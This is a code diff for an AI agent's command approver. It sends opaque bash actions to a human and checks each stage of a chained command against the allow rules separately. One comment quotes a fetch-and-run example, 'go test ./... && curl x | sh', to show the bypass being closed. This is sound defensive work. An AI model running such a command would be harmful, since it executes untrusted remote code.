@@ -269,6 +269,9 @@ func (g *GatedApprover) Approve(ctx context.Context, req Request) (Decision, err
 	if g.mustAsk(req) {
 		return g.ask(ctx, req)
 	}
+	if req.Tool == "bash" && isOpaque(req.Action) {
+		return g.ask(ctx, req)
+	}
 	if g.isAllowed(req) {
 		return Allow, nil
 	}
@@ -335,20 +338,36 @@ func (g *GatedApprover) isAllowed(req Request) bool {
 	if g.Mode == ModePlan && req.Tool != "bash" {
 		return false
 	}
-	for _, r := range g.Rules.Allow {
-		if r.Matches(req, g.Root) {
-			return true
+	if req.Tool != "bash" {
+		for _, r := range g.Rules.Allow {
+			if r.Matches(req, g.Root) {
+				return true
+			}
+		}
+		return false
+	}
+	// Every stage must be allowed on its own: "go test ./... && curl x | sh"
+	// is not covered by an allow rule for "go test".
+	for _, stage := range splitStages(req.Action) {
+		if stage = normalizeCommand(stage); stage != "" && !g.stageAllowed(stage) {
+			return false
 		}
 	}
-	if req.Tool != "bash" {
-		return false
+	return true
+}
+
+func (g *GatedApprover) stageAllowed(stage string) bool {
+	for _, r := range g.Rules.Allow {
+		if r.Matches(Request{Tool: "bash", Action: stage}, g.Root) {
+			return true
+		}
 	}
 	// Both auto and plan let an inspection command through. Refusing one in
 	// plan mode costs a step and teaches the model nothing: it wanted to
 	// look, which is the whole point of the mode.
 	switch g.Mode {
 	case ModeAuto, ModePlan:
-		return isReadOnlyCommand(normalizeCommand(req.Action))
+		return isReadOnlyCommand(stage)
 	}
 	return false
 }
